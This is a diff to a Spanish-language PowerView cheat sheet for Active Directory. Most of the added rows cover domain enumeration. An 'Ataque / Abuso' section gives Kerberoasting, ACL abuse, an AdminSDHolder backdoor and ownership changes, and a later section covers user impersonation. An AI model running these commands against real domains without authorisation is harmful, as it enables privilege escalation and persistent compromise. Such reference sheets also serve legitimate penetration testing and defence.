@@ -35,11 +35,47 @@
 | Obtener miembros de grupo local (rápido)   | `Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local` |
 | Buscar usuarios en máquinas con delegación | `Find-DomainUserLocation -ComputerUnconstrained -ShowAll`               |
 
-# Enumeración del dominio y politicas
-| *Función*                    | Comando                                           |
+# Enumeración del dominio y políticas
+| *Función*                    | *Comando*                                         |
 | ---------------------------- | ------------------------------------------------- |
 | Obtener Global Catalogs      | `Get-ForestGlobalCatalog`                         |
 | Obtener política del dominio | `$DomainPolicy = Get-DomainPolicy -Policy Domain` |
 | Ver política Kerberos        | `$DomainPolicy.KerberosPolicy`                    |
 | Ver política de contraseñas  | `$DomainPolicy.SystemAccess`                      |
 | Política del DC              | `$DCPolicy = Get-DomainPolicy -Policy DC`         |
+
+# Delegación y privilegios
+| *Función*                                    | *Comando*                                                             |
+| -------------------------------------------- | --------------------------------------------------------------------- |
+| Ver máquinas donde un usuario es admin local | `Get-DomainGPOUserLocalGroupMapping -Identity <User>`                 |
+| Ver acceso RDP de un usuario                 | `Get-DomainGPOUserLocalGroupMapping -Identity <USER> -LocalGroup RDP` |
+| Exportar GPOs a CSV                          | `Get-DomainGPOUserLocalGroupMapping \| Export-CSV gpo_map.csv`        |
+| GPO aplicadas a una máquina                  | `Get-DomainGPO -ComputerIdentity <host>`                              |
+
+# Búsqueda y descubrimiento
+| *Función*                                | *Comando*                                                                |
+| ---------------------------------------- | ------------------------------------------------------------------------ |
+| Buscar archivos interesantes en shares   | `Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential` |
+| Buscar equipos con propiedades anómalas  | `Get-DomainComputer -FindOne \| Find-DomainObjectPropertyOutlier`        |
+| Buscar usuarios en Domain Admins con SPN | `Get-DomainUser -SPN \| ?{$_.memberof -match 'Domain Admins'}`           |
+
+# Ataque / Abuso
+| *Función*                                | *Comando*                                                                                        |
+| ---------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| Kerberoasting en una OU                  | `Invoke-Kerberoast -SearchBase "LDAP://OU=..."`                                                  |
+| Añadir permisos para resetear contraseña | `Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword`         |
+| Backdoor AdminSDHolder                   | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalIdentity matt -Rights All` |
+| Cambiar propietario de objeto            | `Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y`                                     |
+| Modificar propiedades de usuario         | `Set-DomainObject testuser -Set @{...}`                                                          |
+
+# Relaciones entre dominios
+| *Función*                                    | *Comando*                                                                                      |
+| -------------------------------------------- | ---------------------------------------------------------------------------------------------- |
+| Enumerar usuarios extranjeros (cross-domain) | `Get-DomainObject -SearchBase "GC://..." -LDAPFilter '(objectclass=foreignSecurityPrincipal)'` |
+# Persistencia y utilidades
+| *Función*                   | *Comando*                                    |
+| --------------------------- | -------------------------------------------- |
+| Exportar usuarios a XML     | `Get-DomainUser \| Export-Clixml user.xml`   |
+| Importar usuarios desde XML | `$Users = Import-Clixml user.xml`            |
+| Impersonar usuario          | `Invoke-UserImpersonation -Credential $Cred` |
+| Revertir impersonación      | `Invoke-RevertToSelf`                        |
